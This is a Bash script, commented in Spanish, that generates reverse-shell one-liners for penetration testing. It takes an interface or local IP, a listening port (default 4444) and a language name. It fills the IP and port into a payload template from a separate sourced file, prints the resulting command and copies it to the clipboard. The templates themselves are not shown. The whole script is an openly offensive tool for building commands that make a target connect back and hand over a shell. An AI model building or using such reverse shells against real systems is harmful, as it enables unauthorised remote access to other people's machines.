#!/usr/bin/env bash

#
#
#	OneLiner Reverse Shell
#
#					ODBK   |   odbksec@protonmail.com
#

source network
source plantillas
source oneliner

export DEBIAN_FRONTEND=noninteractive

trap ctrl_c INT

function ctrl_c(){
	error "Forzando salida"
	exit 0
}

function ayuda(){
	# Cargo los oneliners
	informacion "${azul}-i${finColor} Interfaz de la cual se obtendrá la IP"
    informacion "${azul}-l${finColor} IP Local (opcional)"
    informacion "${azul}-p${finColor} Puerto a la escucha. Defecto: 4444"
    informacion "${azul}-s${finColor} Script a usar para generar la shell. Disponibles:"
	informacion "\t${amarillo}${langs}${finColor}"
    informacion "${azul}-h${finColor} Muestra esta ayuda"
    echo -e "\n"
	exit 0
}


#	MAIN
	banner "${verde}Reverse Shell Oneliner Generator${finColor}"
	shells=`cut -d'=' -f1 oneliner`
	langs=`echo $shells`

	while getopts ":i:l:p:s:h" arg; do
		case $arg in
			i) iface=$OPTARG;;
			p) port=$OPTARG;;
			s) lang=$OPTARG;;
			l) lhost=$OPTARG;;
			h) ayuda;;
		esac
	done


	# Checamos el puerto
	if  [ $(checkPort $port) ] ; then
        informacion "${verde}Puerto Local: ${finColor}"$port
    else
    	port=4444
    fi

    if [[ $lhost ]]; then
    	ip=$lhost
        informacion "${verde}IP local: ${finColor}"$lhost
    else
    	# Cargamos todas las interfaces
		ifaces=($(ifconfig | grep flags | awk '{ print $1}' | sed -e 's/:$//'))

		# Checamos que  la interfaz elegida exista si no fallo
		if [[ "${ifaces[@]}" =~ "${iface}" ]]; then
			ip=`ifconfig ${iface} | grep "inet" | grep -v "inet6" | awk '{ print $2}'`
			informacion "${verde}IP Local: ${finColor}"$ip
		else
			informacion "${rojo}Interfaz erronea .... Saliendo${finColor}"
			exit 0
		fi
	fi
	

	# Checamos lenguaje
	if [[ "${shells[@]}" =~ "${lang}" ]]; then
		line=`eval echo '$'$lang`
		informacion "${verde}Payload: ${finColor}"$line
      	oneliner=${line/"##ip##"/$ip}
       	oneliner=${oneliner/"##port##"/$port}
        echo $oneliner | xclip -sel clip
        resultado "${amarillo}Resultado\n ${finColor}"$oneliner
        informacion "${turquesa}En su clipboard si tiene instalado XCLIP"$finColor
    else
        error "Lenguaje no disponible .... Saliendo"
        exit 0
    fi

